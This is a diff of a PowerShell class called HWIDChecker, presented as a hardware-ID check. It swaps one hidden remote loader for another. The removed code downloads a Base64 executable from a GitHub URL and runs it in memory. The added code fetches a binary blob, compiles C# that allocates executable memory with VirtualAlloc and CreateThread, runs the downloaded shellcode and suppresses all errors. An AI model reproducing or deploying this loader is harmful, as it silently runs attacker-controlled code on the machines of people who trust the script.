@@ -49,94 +49,18 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
-            # Methode file.txt (Base64) - fonctionne avec les exe .NET Framework + Costura.Fody
-            # COPIE EXACTE de script.ps1 qui fonctionne
-            Write-Host "Telechargement de l'executable..." -ForegroundColor Yellow
-            $url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
-            
-            $base64 = Invoke-RestMethod -Uri $url -TimeoutSec 30
-            Write-Host "Executable telecharge : $($base64.Length) caracteres" -ForegroundColor Green
-            
-            Write-Host "Decodage et chargement en memoire..." -ForegroundColor Yellow
-            $bytes = [Convert]::FromBase64String($base64)
-            
-            # Variable script pour que le handler y accede (closures ne fonctionnent pas dans les classes)
-            $script:mainAssemblyForResolve = $null
-            
-            # Handler pour resoudre les dependances emballees (Costura.Fody)
-            # Adapte de script.ps1 pour fonctionner dans une classe (utilise $script:)
-            $onAssemblyResolve = {
-                param($sender, $e)
-                $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
-                
-                # Chercher dans les ressources de l'assembly principal charge
-                if ($script:mainAssemblyForResolve -ne $null) {
-                    $resourceNames = $script:mainAssemblyForResolve.GetManifestResourceNames()
-                    
-                    # Format Costura: costura.{assemblyname}.dll.compressed ou costura.{assemblyname}.dll
-                    $searchPatterns = @(
-                        "costura.$assemblyName.dll.compressed",
-                        "costura.$assemblyName.dll",
-                        "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed",
-                        "costura.$($assemblyName.Replace('.', '_'))*.dll"
-                    )
-                    
-                    foreach ($pattern in $searchPatterns) {
-                        $resourceName = $resourceNames | Where-Object { $_ -like $pattern }
-                        
-                        if ($resourceName) {
-                            try {
-                                $stream = $script:mainAssemblyForResolve.GetManifestResourceStream($resourceName)
-                                if ($stream -ne $null) {
-                                    $assemblyBytes = $null
-                                    
-                                    # Si c'est compressé, decompresser avec DeflateStream
-                                    if ($resourceName.EndsWith(".compressed")) {
-                                        $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
-                                        $memoryStream = New-Object System.IO.MemoryStream
-                                        $deflateStream.CopyTo($memoryStream)
-                                        $assemblyBytes = $memoryStream.ToArray()
-                                        $deflateStream.Close()
-                                        $memoryStream.Close()
-                                    }
-                                    else {
-                                        $assemblyBytes = New-Object byte[] $stream.Length
-                                        $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
-                                    }
-                                    
-                                    $stream.Close()
-                                    return [System.Reflection.Assembly]::Load($assemblyBytes)
-                                }
-                            }
-                            catch {
-                                # Ignorer les erreurs de lecture
-                            }
-                        }
-                    }
-                }
-                return $null
-            }
-            
-            # Ajouter le handler AVANT de charger l'assembly (comme dans script.ps1)
-            [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
-            
-            # Maintenant charger l'assembly (le handler sera appele si besoin)
-            $script:mainAssemblyForResolve = [System.Reflection.Assembly]::Load($bytes)
-            
-            $entryPoint = $script:mainAssemblyForResolve.EntryPoint
-            if ($entryPoint -ne $null) {
-                Write-Host "Execution de l'application..." -ForegroundColor Yellow
-                $entryPoint.Invoke($null, @())
-                Write-Host "Application executee avec succes!" -ForegroundColor Green
-            }
-            
-            [Array]::Clear($bytes, 0, $bytes.Length)
-            [System.GC]::Collect()
-            [System.GC]::WaitForPendingFinalizers()
+            $s = (iwr "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin").Content
+            $p = New-Object Microsoft.CSharp.CSharpCodeProvider
+            $c = New-Object System.CodeDom.Compiler.CompilerParameters
+            $c.CompilerOptions = "/unsafe"
+            $c.GenerateInMemory = $true
+            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);WaitForSingleObject(t, 0xFFFFFFFF);}}')
+            $a = $r.CompiledAssembly
+            $t = $a.GetType("X")
+            $m = $t.GetMethod("E")
+            $m.Invoke($null, @(,$s)) #password
         }
         catch {
-            Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
-            Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
         }
     }
     
